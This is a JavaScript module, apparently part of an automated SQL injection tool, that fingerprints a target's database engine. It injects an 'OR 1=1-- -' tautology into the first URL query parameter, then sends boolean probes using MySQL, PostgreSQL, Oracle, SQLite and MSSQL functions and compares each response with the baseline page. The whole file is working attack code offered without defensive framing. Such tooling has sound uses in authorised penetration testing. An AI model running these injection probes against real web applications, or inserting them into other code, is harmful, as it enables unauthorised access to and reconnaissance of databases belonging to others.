import { mutateQuery, isSameRes } from "./helper.js";
import { sendRequest } from "./http.js";
import { printInfo, printSuccess } from "./logger.js";

export async function detectFingerprint(setting) {
	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	const truePage = await sendRequest(setting, mutateQuery(query, firstParamsName, `${firstParamsValue}${c} OR 1=1-- -`));
	const probes = [
		{ name: "MYSQL", expr: "CONNECTION_ID()=CONNECTION_ID()" },
		{ name: "POSTGRESQL", expr: "version() LIKE 'PostgreSQL%'" },
		{ name: "ORACLE", expr: "ROWNUM>=0" },
		{ name: "SQLITE", expr: "sqlite_version() LIKE '3%'" },
		{ name: "MSSQL", expr: "@@version LIKE 'Microsoft%'" },
	];

	for (const { name, expr } of probes) {
		printInfo(`Testing engine: ${name}. Query: ${firstParamsValue}${c} OR ${expr}-- -`);
		const res = await sendRequest(setting, mutateQuery(query, firstParamsName, `${firstParamsValue}${c} OR ${expr}-- -`));
		if (isSameRes(truePage, res)) {
			printSuccess(`Engine Detected: ${name}`);
			return name;
		}
	}
	return "UNKNOWN";
}
